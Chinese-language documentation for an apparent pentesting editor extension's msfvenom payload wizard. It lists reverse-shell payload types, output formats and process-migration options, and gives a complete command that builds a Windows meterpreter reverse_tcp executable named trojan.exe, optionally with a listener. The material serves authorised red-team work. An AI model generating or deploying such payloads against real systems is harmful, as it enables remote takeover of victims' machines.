# 载荷生成

交互式 MSFVenom 载荷创建向导，可选自动启动监听器。

## 命令

```
weapon task: Create msfvenom payload
```

命令 ID：`weapon.task.msfvenom_creation`

## 交互流程

1. **选择载荷类型**：`windows/x64/meterpreter/reverse_tcp`、`linux/x64/meterpreter/reverse_tcp`、PHP、Python、Java 等
2. **选择输出格式**：`exe`、`elf`、`psh`、`dll`、`hta-psh`、`raw`、`jsp`、`war` 等
3. **选择高级选项**（多选）：
   - `PrependMigrate=true PrependMigrateProc=explorer.exe`
   - `PrependFork=true`
   - `AutoSystemInfo=false`
4. **指定输出文件名**：默认 `./trojan`，支持 `${workspaceFolder}/payloads/shell`
5. **是否启动监听器**：可选自动启动匹配的 `exploit/multi/handler`

## 生成命令示例

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  PrependMigrate=true PrependMigrateProc=explorer.exe \
  -o ./trojan.exe -f exe
```

## 配置

| 设置 | 说明 |
|------|------|
| `weaponized.msf.venom` | MSFVenom 可执行文件路径 |
| `weaponized.lhost` | 反向连接的 LHOST |
| `weaponized.lport` | 反向连接的 LPORT |

## 关键文件

- `src/features/tasks/commands/msfvenom.ts`
- `src/features/tasks/terminals/taskTerminal.ts`
